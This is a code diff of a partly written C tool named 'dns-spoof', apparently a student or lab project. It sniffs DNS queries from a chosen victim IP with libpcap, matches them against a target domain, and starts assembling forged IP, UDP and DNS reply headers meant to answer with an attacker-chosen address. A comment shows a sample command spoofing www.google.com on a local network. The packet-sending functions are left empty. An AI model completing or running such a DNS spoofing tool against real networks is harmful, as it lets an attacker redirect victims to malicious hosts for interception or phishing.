@@ -2,6 +2,9 @@
  * To change this license header, choose License Headers in Project Properties.
  * To change this template file, choose Tools | Templates
  * and open the template in the editor.
+ * 
+ * 
+ * ./dns-spoof -v 192.168.0.19 -r www.google.com -a 192.168.0.19
  */
 
 /* 
@@ -74,19 +77,20 @@ void* pcap_setup(char *filter) {
     }
 }
 
+struct my_header* init_header() {
+    struct my_header* my_hdr = malloc(sizeof (struct my_header));
+    return my_hdr;
+}
+
 void pkt_callback(u_char *args, const struct pcap_pkthdr *pkt_hdr, const u_char* packet) {
     static int count = 1;
 
-    //fprintf(stderr, "%s", "pkt_callback()");
-
-    u_int16_t type = handle_ethernet(args, pkt_hdr, packet);
+    u_int16_t type = handle_ethernet(pkt_hdr, packet);
 
     if (type == ETHERTYPE_IP) {
-//        fprintf(stderr, "Packet type = [%s]\n", "IP");
-        handle_IP(args, pkt_hdr, packet);
+        handle_IP(pkt_hdr, packet);
     } else if (type == ETHERTYPE_ARP) {
         fprintf(stderr, "Packet type = [%s]\n", "ARP");
-        //handle_arp(args, pkt_hdr, packet);
     } else if (type == ETHERTYPE_REVARP) {
         fprintf(stderr, "Packet type = [%s]\n", "RARP");
     }
@@ -94,9 +98,8 @@ void pkt_callback(u_char *args, const struct pcap_pkthdr *pkt_hdr, const u_char*
     count++;
 }
 
-u_int16_t handle_ethernet(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
+u_int16_t handle_ethernet(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
     u_int caplen = pkthdr->caplen;
-    u_int length = pkthdr->len;
     struct sniff_ethernet *ethernet;
     u_short ether_type;
 
@@ -112,7 +115,7 @@ u_int16_t handle_ethernet(u_char *args, const struct pcap_pkthdr* pkthdr, const 
     return ether_type;
 }
 
-u_char* handle_IP(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
+u_char* handle_IP(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
     struct my_ip *ip;
     u_int length = pkthdr->len;
     u_int hlen, off, version;
@@ -158,7 +161,7 @@ u_char* handle_IP(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* 
     switch (ip->ip_p) {
         case IPPROTO_UDP:
             submit_log("handle_IP(): Protocol: [%s]\n", "UDP");
-            handle_UDP(args, pkthdr, packet);
+            handle_UDP(pkthdr, packet);
             break;
         default:
             submit_log("handle_IP(): Protocol: [%s]\n", "unknown");
@@ -166,7 +169,7 @@ u_char* handle_IP(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* 
     }
 }
 
-u_char* handle_UDP(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
+u_char* handle_UDP(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
     struct udp_hdr *udp;
     struct my_ip *ip;
     struct sniff_ethernet *ethernet;
@@ -193,18 +196,15 @@ u_char* handle_UDP(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char*
 
     dns_pkt = (char *) (packet + ETHER_HDRLEN + ip_len + udp_len);
 
-    handle_DNS(args, pkthdr, packet);
+    handle_DNS(packet);
 }
 
-void handle_DNS(u_char *args, const struct pcap_pkthdr* pkthdr, const char* packet) {
+void handle_DNS(const char* packet) {
     struct dns_query *dnsquery;
     struct udp_hdr *udp;
     struct my_ip *ip;
     struct sniff_ethernet *ethernet;
-    int udp_len, ip_len;
-    char *dns_pkt;
-    u_int caplen = pkthdr->caplen;
-    char *pkt;
+    int ip_len;
     char *url;
 
     url = allocate_strmem(REQUEST_SIZE);
@@ -216,18 +216,27 @@ void handle_DNS(u_char *args, const struct pcap_pkthdr* pkthdr, const char* pack
     ip = (struct my_ip *) (packet + ETHER_HDRLEN);
     ip_len = IP_HL(ip) * 4;
 
+    extract_ip_from_iphdr(ip);
+
     udp = (struct udp_hdr *) (packet + ETHER_HDRLEN + ip_len);
+    header_info->src_port = udp->uh_sport;
 
-    dnsquery->qname = (char*) (packet + ETHER_HDRLEN + ip_len + sizeof(struct udp_hdr) + sizeof (struct DNS_HEADER));
-
-    //    pkt = packet;
-    //    dnsquery = (struct dns_query *) (pkt + sizeof (struct DNS_HEADER));
-
-    //fprintf(stderr, "Original: %s\n", dnsquery->qname);
+    dnsquery->qname = (char*) (packet + ETHER_HDRLEN + ip_len + sizeof (struct udp_hdr) + sizeof (struct DNS_HEADER));
 
     url = extract_dns_request(dnsquery);
+    header_info->url_query = url;
 
-    fprintf(stdout, "Extracted: %s\n", url);
+    if (strcmp(header_info->url_query, header_info->request) == 0) {
+        fprintf(stderr, "URL Match found\n");
+    }
+}
+
+/**
+ * Extracts an ip from a ip header
+ */
+void extract_ip_from_iphdr(struct my_ip* ip) {
+    header_info->ip_src = ip->ip_src;
+    header_info->ip_dst = ip->ip_dst;
 }
 
 /**
@@ -243,7 +252,6 @@ char* extract_dns_request(struct dns_query *dnsquery) {
 
     fprintf(stderr, "%s", "                |> extract_dns_request()\n");
     request = allocate_strmem(REQUEST_SIZE);
-    fprintf(stderr, "%s URL: %s\n", "                    |> ", curr);
 
     size = curr[0];
 
@@ -261,7 +269,101 @@ char* extract_dns_request(struct dns_query *dnsquery) {
     }
     request[--j] = '\0';
 
+    fprintf(stderr, "%s URL: %s\n", "                    |> ", request);
+
     return request;
+}
+
+struct ip build_ip_hdr() {
+    struct ip send_iphdr;
+    int *ip_flags, status, id;
+    time_t t;
+
+    srand((unsigned) time(&t)); /* Intializes random number generator */
+    id = rand() % 9999 + 1;
+
+    ip_flags = allocate_intmem(4);
+    send_iphdr.ip_hl = IP4_HDRLEN / sizeof (uint32_t); // IPv4 header length (4 bits): Number of 32-bit words in header = 5
+    send_iphdr.ip_v = 4; // Internet Protocol version (4 bits): IPv4
+    send_iphdr.ip_tos = 0; // Type of service (8 bits)
+    send_iphdr.ip_len = htons(IP4_HDRLEN + sizeof (struct udp_hdr) + sizeof (struct DNS_HEADER) + sizeof (struct RES_RECORD)); // Total length of datagram (16 bits): IP header + ICMP header + ICMP data
+    send_iphdr.ip_id = htons(id); // ID sequence number (16 bits): unused, since single datagram
+    ip_flags[0] = 0; // Zero (1 bit)
+    ip_flags[1] = 1; // Do not fragment flag (1 bit)
+    ip_flags[2] = 0; // More fragments following flag (1 bit)
+    ip_flags[3] = 0; // Fragmentation offset (13 bits)
+    send_iphdr.ip_off = htons((ip_flags[0] << 15) + (ip_flags[1] << 14) + (ip_flags[2] << 13) + ip_flags[3]); // Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram
+    send_iphdr.ip_ttl = 64; // Time-to-Live (8 bits): default to maximum value
+    send_iphdr.ip_p = UDP_PKT; // UDP Packet Type
+    send_iphdr.ip_src = header_info->ip_dst;
+    send_iphdr.ip_dst = header_info->ip_src;
+    send_iphdr.ip_sum = 0;
+    send_iphdr.ip_sum = ipv4_checksum((uint16_t *) & send_iphdr, IP4_HDRLEN); // IPv4 header checksum (16 bits): set to 0 when calculating checksum
+
+    return send_iphdr;
+}
+
+struct udp_hdr build_udp_hdr() {
+    struct udp_hdr udp;
+    
+    udp.uh_sport = htons(53);
+    udp.uh_dport = header_info->src_port;
+    udp.uh_ulen = htons(sizeof(struct udp_hdr) + sizeof(struct DNS_HEADER) + sizeof(struct dns_query) + sizeof(struct RES_RECORD));
+    udp.uh_sum = 0;
+    udp.uh_sum = ipv4_checksum((uint16_t *) &udp, sizeof(struct udp_hdr));
+    
+    return udp;
+}
+
+int build_dns_answer(struct DNS_HEADER *dns_hdr, char *answer) {
+    unsigned int size = 0;
+    struct dns_query *dns_query;
+    unsigned char ans[4];
+
+    sscanf(header_info->response, "%d.%d.%d.%d", (int *) &ans[0], (int *) &ans[1], (int *) &ans[2], (int *) &ans[3]);
+
+    dns_query = (struct dns_query*) (((char*) dns_hdr) + sizeof (struct DNS_HEADER));
+
+    dns_hdr->id = (unsigned short) htons(getpid()); // ID
+    dns_hdr->qr = 1; // We give a response, Volgens RFC: (= query (0), or a response (1).)
+    dns_hdr->opcode = 0; // default
+    dns_hdr->aa = 0; //Not Authoritative,RFC: (= Authoritative Answer - this bit is valid in responses, and specifies that the responding name server is an authority for the domain name in question section.)
+    dns_hdr->tc = 0; // Not truncated
+    dns_hdr->rd = 1; // Enable recursion
+    dns_hdr->ra = 0; // Nameserver supports recursion?
+    dns_hdr->z = 0; //  RFC: (= Reserved for future use.  Must be zero in all queries and responses.)
+    dns_hdr->rcode = 0; // No error condition
+    dns_hdr->q_count = 0; // No questions!
+    dns_hdr->ad = 0; // How man resource records?
+    dns_hdr->cd = 0; // !checking
+    dns_hdr->ans_count = 1; // We give 1 answer
+    dns_hdr->auth_count = 0; // How many authority entries?
+    dns_hdr->add_count = 0; // How many resource entries?
+
+    return size;
+}
+
+void build_response_packet() {
+    struct DNS_HEADER *dns_hdr;
+    struct ip ip_hdr;
+    struct udp_hdr udp;
+
+    char datagram[DATAGRAM_SIZE];
+    char *answer;
+    unsigned int datagram_size;
+    
+    ip_hdr = build_ip_hdr();
+    udp = build_udp_hdr();
+
+//    memset(datagram, 0, DATAGRAM_SIZE);
+
+//    answer = datagram + sizeof (struct my_ip) + sizeof (struct udp_hdr);
+
+
+}
+
+uint8_t* build_ether_frame(struct ip send_iphdr, struct udp_hdr udp, struct DNS_HEADER dns_hdr, struct RES_RECORD response_hdr) {
+
 }
 
 /*
@@ -275,41 +377,75 @@ int main(int argc, char** argv) {
     char *spoof_address = NULL; // Spoofed Address in the Answer
     int c, status;
 
-    /*if (argc < 9) {
-        fprintf(stderr, "\nPlease use -i for Network Interface \nAND -v for Victim IP Address \nAND -r for the domain \n AND -a for the spoofed address \nOR -h for help");
-    } else {
-        while ((c = getopt(argc, argv, "i:v:r:a:h")) != 1) {
-            switch (c) {
-                case 'i': // device interface
-                    interface_name = optarg;
-                    break;
-                case 'v': // Victim machines IP address
-                    victim_ip = optarg;
-                    break;
-                case 'r': // Domain name you want to spoof
-                    request = optarg;
-                    break;
-                case 'a': // Address you want to send in the answer
-                    spoof_address = optarg;
-                    break;
-                case '?':
-                    submit_log("%s", "arguments missing");
-                    return EXIT_FAILURE;
-            }
+    if (argc < 7) {
+        fprintf(stderr, "Use\n    -v for Victim IP Address \nAND -r for the domain \nAND -a for the spoofed address\n");
+        return (EXIT_FAILURE);
+    }
+
+    header_info = init_header();
+
+    while ((c = getopt(argc, argv, "v:r:a:")) != -1) {
+        switch (c) {
+            case 'v': // Victim machines IP address
+                victim_ip = optarg;
+                break;
+            case 'r': // Domain name you want to spoof
+                header_info->request = optarg;
+                break;
+            case 'a': // Address you want to send in the answer
+                header_info->response = optarg;
+                break;
+            case '?':
+                submit_log("%s", "arguments missing");
+                return EXIT_FAILURE;
         }
     }
 
-    if ((status = asprintf(&filter, "%s %s", "udp and port 53 and src", victim_ip)) < 0) {
-        fprintf(stderr, "Unable to get the Victim IP Address");
-    }*/
 
-    filter = "udp and port 53 and src 192.168.0.19";
+    if ((status = asprintf(&filter, "%s%s", "udp and port 53 and src ", victim_ip)) < 0) {
+        fprintf(stderr, "Unable to get the Victim IP Address");
+    }
+
+    fprintf(stderr, "Filter     :   %s\n", filter);
+    fprintf(stderr, "Request    :   %s\n", header_info->request);
+    fprintf(stderr, "Response   :   %s\n", header_info->response);
+
+
+    //filter = "udp and port 53 and src 192.168.0.19";
 
     pcap_setup(filter);
 
     return (EXIT_SUCCESS);
 }
 
+uint16_t ipv4_checksum(uint16_t *addr, int len) {
+    int count = len;
+    register uint32_t sum = 0;
+    uint16_t answer = 0;
+
+    // Sum up 2-byte values until none or only one byte left.
+    while (count > 1) {
+        sum += *(addr++);
+        count -= 2;
+    }
+
+    // Add left-over byte, if any.
+    if (count > 0) {
+        sum += *(uint8_t *) addr;
+    }
+
+    // Fold 32-bit sum into 16 bits; we lose information by doing this,
+    // increasing the chances of a collision.
+    // sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)
+    while (sum >> 16) {
+        sum = (sum & 0xffff) + (sum >> 16);
+    }
+
+    // Checksum is one's compliment of sum.
+    answer = ~sum;
+
+    return (answer);
+}
 
 // Allocate memory for an array of chars.
 
@@ -327,6 +463,26 @@ char * allocate_strmem(int len) {
         return (tmp);
     } else {
         fprintf(stderr, "16. ERROR: Cannot allocate memory for array allocate_strmem().\n");
+        exit(EXIT_FAILURE);
+    }
+}
+
+// Allocate memory for an array of ints.
+
+int* allocate_intmem(int len) {
+    void *tmp;
+
+    if (len <= 0) {
+        fprintf(stderr, "17. ERROR: Cannot allocate memory because len = %i in allocate_intmem().\n", len);
+        exit(EXIT_FAILURE);
+    }
+
+    tmp = (int *) malloc(len * sizeof (int));
+    if (tmp != NULL) {
+        memset(tmp, 0, len * sizeof (int));
+        return (tmp);
+    } else {
+        fprintf(stderr, "18. ERROR: Cannot allocate memory for array allocate_intmem().\n");
         exit(EXIT_FAILURE);
     }
 }
